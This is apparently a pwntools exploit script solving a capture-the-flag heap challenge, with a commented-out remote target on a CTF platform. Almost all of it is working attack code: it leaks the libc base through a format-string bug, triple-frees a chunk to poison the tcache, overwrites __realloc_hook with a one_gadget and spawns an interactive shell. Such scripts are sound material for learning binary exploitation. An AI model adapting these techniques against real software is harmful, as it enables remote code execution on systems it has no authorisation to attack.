from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
#io = remote('node4.buuoj.cn', 29509)
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'Input your choice:'
def add(size, content):
	sla(menu, b'1')
	sla(b'size of story: \n', byte(size))
	sda(b'story: \n', content)

def dele(idx):
	sla(menu, b'4')
	sla(b'index:\n', byte(idx))

def leak(name, ID):
	sda(b'name?\n', name)
	rut(b'-')
	libc.address = int(rut(b'-'), 16) - 17 - libc.symbols['read']
	print("libc_base : ", hex(libc.address))
	sda(b'ID.\n', ID)

leak(b'%p-%p-', b'A')
system = libc.symbols['system']
malloc = libc.symbols['malloc']
realloc = libc.symbols['realloc']
free_hook = libc.symbols['__free_hook']
malloc_hook = libc.symbols['__malloc_hook']
realloc_hook = libc.symbols['__realloc_hook']
print("free_hook", hex(free_hook))
print("malloc : ", hex(malloc))
print("malloc_hook : ", hex(malloc_hook))
print("realloc : ", hex(realloc))


"""
rcx == NULL
[rsp+0x40] == NULL
[rsp+0x70] == NULL
"""
ones = [0x4f2c5, 0x4f322, 0x10a38c]
gadgets = [i+libc.address for i in ones]

add(0x10, b'A\n')
dele(0)
dele(0)
dele(0)
add(0x10, p64(realloc_hook))
add(0x10, b'/bin/sh\x00')
add(0x10, p64(gadgets[1])+p64(realloc+8))
#debug()
sla(menu, b'1')
sla(b'size of story: \n', b'1')

sh()
